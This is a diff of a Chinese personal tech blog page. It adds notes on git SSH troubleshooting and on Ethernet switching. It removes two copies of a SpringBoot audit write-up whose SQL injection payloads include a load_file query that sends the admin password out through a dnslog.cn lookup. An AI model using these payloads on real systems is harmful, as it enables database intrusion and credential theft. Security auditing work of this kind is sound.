@@ -55,166 +55,6 @@
       <div id="middlecontent" title class="global-width sidebar-right">
         <section id="main">
   
-    <article id="post-某个SpringBoot项目的审计" class="article global-container article-type-post" itemscope itemprop="blogPost">
-  
-    <header class="article-header">
-      
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/06/05/某个SpringBoot项目的审计/">某个SpringBoot项目的审计</a>
-    </h1>
-  
-
-    </header>
-  
-  <div class="article-meta">
-    <a href="/2021/06/05/某个SpringBoot项目的审计/" class="article-date">
-  <time datetime="2021-06-05T03:10:39.000Z" itemprop="datePublished">2021-06-05</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/WEB相关/">WEB相关</a>
-  </div>
-
-    
-  </div>
-  
-
-  <div class="article-inner">
-    
-    <div class="article-content article-content-cloud" itemprop="articleBody">
-      
-        <h1 id="某个SpringBoot项目的审计"><a href="#某个SpringBoot项目的审计" class="headerlink" title="某个SpringBoot项目的审计"></a>某个SpringBoot项目的审计</h1><p>在github上看到的这个SpringBoot项目，作者刚提交不久，一些功能还没完善。好奇心让我下载了这个项目，打算在本地审计一波，遂有了此文。</p>
-<p>拿到一个java的项目，我习惯先看是什么框架。持久层用的什么，然后是maven项目的话，pom文件里的依赖都是哪些，版本又是如何。再就是看项目里filter对参数的过滤情况。</p>
-<h3 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h3><ul>
-<li>第一处注入</li>
-</ul>
-<p>项目的持久层用的mybatis，这里我就直接查看项目里的sql映射文件，看到这一处sql语句，${sql}完全可控，明显一处注入</p>
-<p><img src="/images/Article_images/image-20210614131759313.png" alt="image-20210614131759313"></p>
-<p>一路跟上去看看有没有调用的</p>
-<p>，<img src="/images/Article_images/image-20210614132523077.png" alt="image-20210614132523077"></p>
-<p><img src="/images/Article_images/image-20210614132822231.png" alt="image-20210614132822231"></p>
-<p>可惜的是，作者唯独没调用这个getAreaBySql，应该是项目还没完善吧。为了验证一下这里的问题，我在controller里自己加了一处调用该函数。</p>
-<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@PostMapping(&quot;/getAreaBySql&quot;)</span><br><span class="line">public RespDto&lt;List&lt;AreaReturnDto&gt;&gt;  getArea(@RequestParam(&quot;sql&quot;)String sql)&#123;</span><br><span class="line">	List&lt;AreaReturnDto&gt; list=areaService.getAreaBySql(sql);</span><br><span class="line">	return RespDto.succResult(list);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<p>小小的尝试</p>
-<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">sql=(select 1  and extractvalue(1,concat(0x7e,user())))</span><br></pre></td></tr></table></figure></div>
-
-<p><img src="/images/Article_images/image-20210614133459925.png" alt="image-20210614133459925"></p>
-<p>拿到结果，不过这里需要在控制台里才能看到结果，实战中应尝试dnslog拿结果，前提是对方的mysql secure_file_priv不为null，有load_file的权限</p>
-<p><img src="/images/Article_images/image-20210614133554737.png" alt="image-20210614133554737"></p>
-<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dnslog payload</span><br><span class="line">sql=(select load_file(concat(&apos;\\\\&apos;,(select password from sys_member_info where user_name=&apos;admin&apos;),&apos;.4i06oo.dnslog.cn\\test&apos;)))</span><br></pre></td></tr></table></figure></div>
-
-<p><img src="/images/Article_images/image-20210614133917547.png" alt="image-20210614133917547"></p>
-<p>拿到结果</p>
-<p><img src="/images/Article_images/image-20210614134001374.png" alt="image-20210614134001374"></p>
-<ul>
-<li><p>第二处注入</p>
-<p>这两个参数任选其一即可</p>
-<p><img src="/images/Article_images/image-20210614195231427.png" alt="image-20210614195231427"></p>
-<p>看看哪里调用了</p>
-<p><img src="/images/Article_images/image-20210614195501756.png" alt="image-20210614195501756"></p>
-<p><img src="/images/Article_images/image-20210614195539485.png" alt="image-20210614195539485"></p>
-</li>
-</ul>
-<p>  <img src="/images/Article_images/image-20210614195420133.png" alt="image-20210614195420133"></p>
-<p>找到调用的，直接开干，这里需要注意传的数据要是json的，不然得不到结果，也就是下面的enctype那里</p>
-<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">http://localhost:8888/chongzhilog/list</span><br><span class="line">&#123;&quot;page&quot;:1,&quot;limit&quot;:10,&quot;id&quot;:&quot;1&quot;,&quot;startTime&quot;:&quot;1&apos;,&apos;2&apos;,&apos;00:00:00&apos;) and extractvalue(1,concat(0x7e,user()))--+&quot;&#125;</span><br></pre></td></tr></table></figure></div>
-
-<p><img src="/images/Article_images/image-20210614195827125.png" alt="image-20210614195827125"></p>
-<p>得到结果</p>
-<p><img src="/images/Article_images/image-20210614200012714.png" alt="image-20210614200012714"></p>
-<p>同样的可以尝试用dnslog拿到结果</p>
-
-      
-    </div>
-    
-  </div>
-  
-  
-</article>
-
-  
-    <article id="post-某个SpringBoot系统的审计" class="article global-container article-type-post" itemscope itemprop="blogPost">
-  
-    <header class="article-header">
-      
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/06/05/某个SpringBoot系统的审计/">某个SpringBoot项目的审计</a>
-    </h1>
-  
-
-    </header>
-  
-  <div class="article-meta">
-    <a href="/2021/06/05/某个SpringBoot系统的审计/" class="article-date">
-  <time datetime="2021-06-05T03:10:39.000Z" itemprop="datePublished">2021-06-05</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/WEB相关/">WEB相关</a>
-  </div>
-
-    
-  </div>
-  
-
-  <div class="article-inner">
-    
-    <div class="article-content article-content-cloud" itemprop="articleBody">
-      
-        <h1 id="某个SpringBoot项目的审计"><a href="#某个SpringBoot项目的审计" class="headerlink" title="某个SpringBoot项目的审计"></a>某个SpringBoot项目的审计</h1><p>在github上看到的这个SpringBoot项目，作者刚提交不久，一些功能还没完善。好奇心让我下载了这个项目，打算在本地审计一波，遂有了此文。</p>
-<p>拿到一个java的项目，我习惯先看是什么框架。持久层用的什么，然后是maven项目的话，pom文件里的依赖都是哪些，版本又是如何。再就是看项目里filter对参数的过滤情况。</p>
-<h3 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h3><ul>
-<li>第一处注入</li>
-</ul>
-<p>项目的持久层用的mybatis，这里我就直接查看项目里的sql映射文件，看到这一处sql语句，${sql}完全可控，明显一处注入</p>
-<p><img src="D:%5CDesktop%5C%E6%88%91%E7%9A%84%E7%AC%94%E8%AE%B0%5C%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95%5C%E6%9F%90%E4%B8%AASpringBoot%E9%A1%B9%E7%9B%AE%E7%9A%84%E5%AE%A1%E8%AE%A1%5Cimage-20210614131759313.png" alt="image-20210614131759313"></p>
-<p>一路跟上去看看有没有调用的</p>
-<p>，<img src="D:%5CDesktop%5C%E6%88%91%E7%9A%84%E7%AC%94%E8%AE%B0%5C%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95%5C%E6%9F%90%E4%B8%AASpringBoot%E9%A1%B9%E7%9B%AE%E7%9A%84%E5%AE%A1%E8%AE%A1%5Cimage-20210614132523077.png" alt="image-20210614132523077"></p>
-<p><img src="D:%5CDesktop%5C%E6%88%91%E7%9A%84%E7%AC%94%E8%AE%B0%5C%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95%5C%E6%9F%90%E4%B8%AASpringBoot%E9%A1%B9%E7%9B%AE%E7%9A%84%E5%AE%A1%E8%AE%A1%5Cimage-20210614132822231.png" alt="image-20210614132822231"></p>
-<p>可惜的是，作者唯独没调用这个getAreaBySql，应该是项目还没完善吧。为了验证一下这里的问题，我在controller里自己加了一处调用该函数。</p>
-<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@PostMapping(&quot;/getAreaBySql&quot;)</span><br><span class="line">public RespDto&lt;List&lt;AreaReturnDto&gt;&gt;  getArea(@RequestParam(&quot;sql&quot;)String sql)&#123;</span><br><span class="line">	List&lt;AreaReturnDto&gt; list=areaService.getAreaBySql(sql);</span><br><span class="line">	return RespDto.succResult(list);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<p>小小的尝试</p>
-<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">sql=(select 1  and extractvalue(1,concat(0x7e,user())))</span><br></pre></td></tr></table></figure></div>
-
-<p><img src="D:%5CDesktop%5C%E6%88%91%E7%9A%84%E7%AC%94%E8%AE%B0%5C%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95%5C%E6%9F%90%E4%B8%AASpringBoot%E9%A1%B9%E7%9B%AE%E7%9A%84%E5%AE%A1%E8%AE%A1%5Cimage-20210614133459925.png" alt="image-20210614133459925"></p>
-<p>拿到结果，不过这里需要在控制台里才能看到结果，实战中应尝试dnslog拿结果，前提是对方的mysql secure_file_priv不为null，有load_file的权限</p>
-<p><img src="D:%5CDesktop%5C%E6%88%91%E7%9A%84%E7%AC%94%E8%AE%B0%5C%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95%5C%E6%9F%90%E4%B8%AASpringBoot%E9%A1%B9%E7%9B%AE%E7%9A%84%E5%AE%A1%E8%AE%A1%5Cimage-20210614133554737.png" alt="image-20210614133554737"></p>
-<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dnslog payload</span><br><span class="line">sql=(select load_file(concat(&apos;\\\\&apos;,(select password from sys_member_info where user_name=&apos;admin&apos;),&apos;.4i06oo.dnslog.cn\\test&apos;)))</span><br></pre></td></tr></table></figure></div>
-
-<p><img src="D:%5CDesktop%5C%E6%88%91%E7%9A%84%E7%AC%94%E8%AE%B0%5C%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95%5C%E6%9F%90%E4%B8%AASpringBoot%E9%A1%B9%E7%9B%AE%E7%9A%84%E5%AE%A1%E8%AE%A1%5Cimage-20210614133917547.png" alt="image-20210614133917547"></p>
-<p>拿到结果</p>
-<p><img src="D:%5CDesktop%5C%E6%88%91%E7%9A%84%E7%AC%94%E8%AE%B0%5C%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95%5C%E6%9F%90%E4%B8%AASpringBoot%E9%A1%B9%E7%9B%AE%E7%9A%84%E5%AE%A1%E8%AE%A1%5Cimage-20210614134001374.png" alt="image-20210614134001374"></p>
-<ul>
-<li><p>第二处注入</p>
-<p>这两个参数任选其一即可</p>
-<p><img src="D:%5CDesktop%5C%E6%88%91%E7%9A%84%E7%AC%94%E8%AE%B0%5C%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95%5C%E6%9F%90%E4%B8%AASpringBoot%E9%A1%B9%E7%9B%AE%E7%9A%84%E5%AE%A1%E8%AE%A1%5Cimage-20210614195231427.png" alt="image-20210614195231427"></p>
-<p>看看哪里调用了</p>
-<p><img src="D:%5CDesktop%5C%E6%88%91%E7%9A%84%E7%AC%94%E8%AE%B0%5C%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95%5C%E6%9F%90%E4%B8%AASpringBoot%E9%A1%B9%E7%9B%AE%E7%9A%84%E5%AE%A1%E8%AE%A1%5Cimage-20210614195501756.png" alt="image-20210614195501756"></p>
-<p><img src="D:%5CDesktop%5C%E6%88%91%E7%9A%84%E7%AC%94%E8%AE%B0%5C%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95%5C%E6%9F%90%E4%B8%AASpringBoot%E9%A1%B9%E7%9B%AE%E7%9A%84%E5%AE%A1%E8%AE%A1%5Cimage-20210614195539485.png" alt="image-20210614195539485"></p>
-</li>
-</ul>
-<p>  <img src="D:%5CDesktop%5C%E6%88%91%E7%9A%84%E7%AC%94%E8%AE%B0%5C%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95%5C%E6%9F%90%E4%B8%AASpringBoot%E9%A1%B9%E7%9B%AE%E7%9A%84%E5%AE%A1%E8%AE%A1%5Cimage-20210614195420133.png" alt="image-20210614195420133"></p>
-<p>找到调用的，直接开干，这里需要注意传的数据要是json的，不然得不到结果，也就是下面的enctype那里</p>
-<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">http://localhost:8888/chongzhilog/list</span><br><span class="line">&#123;&quot;page&quot;:1,&quot;limit&quot;:10,&quot;id&quot;:&quot;1&quot;,&quot;startTime&quot;:&quot;1&apos;,&apos;2&apos;,&apos;00:00:00&apos;) and extractvalue(1,concat(0x7e,user()))--+&quot;&#125;</span><br></pre></td></tr></table></figure></div>
-
-<p><img src="D:%5CDesktop%5C%E6%88%91%E7%9A%84%E7%AC%94%E8%AE%B0%5C%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95%5C%E6%9F%90%E4%B8%AASpringBoot%E9%A1%B9%E7%9B%AE%E7%9A%84%E5%AE%A1%E8%AE%A1%5Cimage-20210614195827125.png" alt="image-20210614195827125"></p>
-<p>得到结果</p>
-<p><img src="D:%5CDesktop%5C%E6%88%91%E7%9A%84%E7%AC%94%E8%AE%B0%5C%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95%5C%E6%9F%90%E4%B8%AASpringBoot%E9%A1%B9%E7%9B%AE%E7%9A%84%E5%AE%A1%E8%AE%A1%5Cimage-20210614200012714.png" alt="image-20210614200012714"></p>
-<p>同样的可以尝试用dnslog拿到结果</p>
-
-      
-    </div>
-    
-  </div>
-  
-  
-</article>
-
-  
     <article id="post-操作系统概述" class="article global-container article-type-post" itemscope itemprop="blogPost">
   
     <header class="article-header">
@@ -689,6 +529,131 @@ __toString()函数是当对象被当做字符串的时候会自动调用该函�
 </article>
 
   
+    <article id="post-git-ssh连不上github问题" class="article global-container article-type-post" itemscope itemprop="blogPost">
+  
+    <header class="article-header">
+      
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/10/04/git-ssh连不上github问题/">git ssh连不上github问题</a>
+    </h1>
+  
+
+    </header>
+  
+  <div class="article-meta">
+    <a href="/2019/10/04/git-ssh连不上github问题/" class="article-date">
+  <time datetime="2019-10-04T14:47:24.000Z" itemprop="datePublished">2019-10-04</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/杂记/">杂记</a>
+  </div>
+
+    
+  </div>
+  
+
+  <div class="article-inner">
+    
+    <div class="article-content article-content-cloud" itemprop="articleBody">
+      
+        <p>开始的时候是可以连上的，后来不知道怎么的就不行了，，，网上找了好久终于解决了，，这里我整理了一下这些问题</p>
+<h1 id="第一种情况"><a href="#第一种情况" class="headerlink" title="第一种情况"></a>第一种情况</h1><ul>
+<li>ping不了github.com<br>到本地hosts文件中添加一条github记录，并且删除.ssh中的known_hosts文件<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">192.30.255.112 github.com git </span><br><span class="line">185.31.16.184 github.global.ssl.fastly.net</span><br></pre></td></tr></table></figure></div>
+
+</li>
+</ul>
+<p>然后本地ping通了github，，，遂解决了连接不上的问题</p>
+<h1 id="第二种情况"><a href="#第二种情况" class="headerlink" title="第二种情况"></a>第二种情况</h1><ul>
+<li>22端口被占用<br>在.ssh文件夹中添加一个config文件，内容为：<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">User git</span><br><span class="line">Hostname ssh.github.com</span><br><span class="line">PreferredAuthentications publickey</span><br><span class="line">IdentityFile ~/.ssh/id_rsa</span><br><span class="line">Port 443</span><br></pre></td></tr></table></figure></div>
+
+</li>
+</ul>
+<h1 id="第三种"><a href="#第三种" class="headerlink" title="第三种"></a>第三种</h1><ul>
+<li>ssh key失效了<br>删除.ssh，重新进行配置<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;yournamne&quot;</span><br><span class="line">git config --global user.email &quot;youremail&quot;</span><br><span class="line">ssh-keygen -t rsa -C &quot;youremail&quot;</span><br><span class="line">将.ssh中id_rsa.pub中的内容复制到github中ssh and gpg keys</span><br></pre></td></tr></table></figure></div>
+
+</li>
+</ul>
+<p>然后尝试连接 ssh -T <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>，输入yes，，如果出现success，就代表连接成功</p>
+
+      
+    </div>
+    
+  </div>
+  
+  
+</article>
+
+  
+    <article id="post-交换机详解" class="article global-container article-type-post" itemscope itemprop="blogPost">
+  
+    <header class="article-header">
+      
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/10/04/交换机详解/">交换机详解</a>
+    </h1>
+  
+
+    </header>
+  
+  <div class="article-meta">
+    <a href="/2019/10/04/交换机详解/" class="article-date">
+  <time datetime="2019-10-04T10:42:06.000Z" itemprop="datePublished">2019-10-04</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/网络工程/">网络工程</a>
+  </div>
+
+    
+  </div>
+  
+
+  <div class="article-inner">
+    
+    <div class="article-content article-content-cloud" itemprop="articleBody">
+      
+        <h1 id="主要内容"><a href="#主要内容" class="headerlink" title="主要内容"></a>主要内容</h1><p>交换机的帧转发技术，mac地址表的维护方式，三种帧转发模式，冲突域和广播域</p>
+<ul>
+<li>帧转发<br>交换机学习“源地址”，基于“目的地址”转发</li>
+</ul>
+<ul>
+<li>交换机转发方式</li>
+</ul>
+<ol>
+<li>直通式<br>比存储转发型更快速<br>两大特点：快速帧转发，无效帧处理<br>快速帧转发：<br>一旦交换机在MAC地址表中查找到目的MAC地址，就立刻做出转发决定。而无需等待帧的剩余部分进入端口再做出转发决定<br>使用直通方式的交换机能够快速决定是否有必要检查帧头的更多部分，以针对额外的过滤目的。例如，交换机可以检查前14个字节（源MAC地址，目的MAC，以太网类型字段），以及对之后的40字节进行检查，以实现IPv4三层和四层相关功能。</li>
+</ol>
+<p>无效帧处理：<br>对于大多数无效帧，直通方式交换机并不将其丢弃。错误帧被转发至其他网段。如果网络中出现高差错率（无效帧），直通交换可能会对带宽造成不利影响，损坏以及无效帧会造成带宽拥塞。在拥塞情况下，这种交换机必须像存储转发交换机那样缓存</p>
+<ol start="2">
+<li><p>存储转发交换<br>交换机在发送信息前八整帧数据读入内存才能并且检查其正确性。虽然这样比直通方式更花时间，但这样可以存储转发数据，从而保证其准确性<br>两大特点：差错控制，自动缓存<br>差错控制：<br>使用存储转发技术的交换机对进入帧进行差错控制。在进入端口接收完整一帧之后，交换机将数据报最后一个字段的帧校验序列（frame check sequence, FCS）与自己的FCS进行比较。FCS校验过程用以帮助确保帧没有物理及数据链路错误，如果该帧校验正确，则交换机转发。否则，丢弃。<br><img src="/images/Article_images/image01.jpg" alt="差错控制"><br>自动缓存：<br>存储转发交换机通过进入端口缓存，支持不同速率以太网的混合连接。例如，接收到一个以1Gb/s速率发出的帧，转发至百兆以太网端口，就需要使用存储转发方式。当进入与输出端口速率不匹配时，交换机将整帧内容放入缓存中，计算FCS校验，转发至输出缓存之后将帧发出。<br>Cisco的主要交换方式是存储转发交换</p>
+</li>
+<li><p>无碎片转发<br>是直通方式的一种改进模式，交换机转发之前检查帧是否大于64字节（小于则丢弃），以保证没有碎片帧。无碎片方式比直通方式拥有更好的差错检测，而实际上没有增加延时。它比较适合于高性能计算应用，即进程到进程延时小于10毫秒的应用场景</p>
+</li>
+</ol>
+<ul>
+<li>交换机域<br>冲突域和广播域<br>形象比喻：<br>局域网好比一栋大楼，每个人（好比主机）有自己的房间（房间就好比网卡，房号就是物理地址，即MAC地址），里面的人（主机）人手一个对讲机，由于工作在同一频道，所以一个人说话，其他人都能听到，这就是广播（向所有主机发送信息包），只有目标才会回应，其他人虽然听见但是不理（丢弃包），而这些能听到广播的所有对讲机设备就够成了一个广播域。而这些对讲机就是集线器（HUB），每个对讲机都像是集线器上的端口，大家都知道对讲机在说话时是不能收听的，必须松开对讲键才能收听，这种同一时刻只能收或者发的工作模式就是半双工。而且对讲机同一时刻只能有一个人说话才能听清楚，如果两个或者更多的人一起说就会产生冲突，都没法听清楚，所以这就构成了一个冲突域。</li>
+</ul>
+<ol>
+<li><p>冲突域<br>【定义】设备间共享同一网段称为冲突域，简单来说就是同一时间内只有一台设备发送信息的范围<br>【分层】osi的第一层（数据链路层）<br>【设备】第二层设备能隔离冲突域 ，如Switch。交换机能缩小冲突域的范围，交换机的每个端口就是一个冲突域</p>
+</li>
+<li><p>广播域<br>【定义】网络中能接受任一设备发出的广播帧的所有设备的集合。简单说如果站点发出一个广播信号，所有能接收到这个信号的设备范围称为一个广播域<br>【分层】osi的第二层（物理层）<br>【设备】第三层设备隔离广播域，如Router。路由器的每一个端口就是一个广播域</p>
+</li>
+</ol>
+<p><strong>冲突域和广播域实例：</strong><br>例一：一个Switch（交换机）直连三台pc和一台hub（集线器），hub下有两台pc<br><img src="/images/Article_images/image02.png" alt="例一"><br>只有第三层设备才能隔离广播域，上图并没有router等第三层设备。所有，这里广播域没有隔离，也就是说上图只有一个广播域。Switch能缩小冲突域，一个Switch端口就是一个冲突域，上图三台pc和一台hub直连到switch上，所有有四个冲突域</p>
+<p>例二：一台router下连两台交换机和一台hub，两台交换机下分别有三台pc，而hub下连有四台pc<br><img src="/images/Article_images/image03.png" alt="例二"><br>算出广播域并不难，router三个端口连接两台switch和一台hub，这样就是三个广播域了。这里两台交换机连六台pc，就是六个冲突域了，外加路由器与集线器之间的一个冲突域，，然后再有就是路由器与两个交换机直接也有两个冲突域，这样总的就是九个冲突域了。</p>
+<p>** 最后的几点注意和总结：**<br>    第二层设备只能隔离冲突域，第三层设备才能隔离广播域<br>    路由器不但能隔离广播域，默认也可以隔离冲突域<br>    路由器下直连交换机，则路由器到交换机也是存在冲突域的。</p>
+
+      
+    </div>
+    
+  </div>
+  
+  
+</article>
+
+  
 
 
   <nav id="page-nav">
@@ -735,7 +700,7 @@ __toString()函数是当对象被当做字符串的时候会自动调用该函�
   <div class="widget-box">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li></ul>
     </div>
   </div>
 
@@ -747,14 +712,6 @@ __toString()函数是当对象被当做字符串的时候会自动调用该函�
       <ul>
         
           <li>
-            <a href="/2021/06/05/某个SpringBoot项目的审计/">某个SpringBoot项目的审计</a>
-          </li>
-        
-          <li>
-            <a href="/2021/06/05/某个SpringBoot系统的审计/">某个SpringBoot项目的审计</a>
-          </li>
-        
-          <li>
             <a href="/2019/11/03/操作系统概述/">操作系统概述</a>
           </li>
         
@@ -764,6 +721,14 @@ __toString()函数是当对象被当做字符串的时候会自动调用该函�
         
           <li>
             <a href="/2019/10/24/CVE-2019-11043-复现/">CVE-2019-11043 复现</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/23/WiFi网络结构/">WiFi网络结构</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/19/Redis小结/">Redis小结</a>
           </li>
         
       </ul>
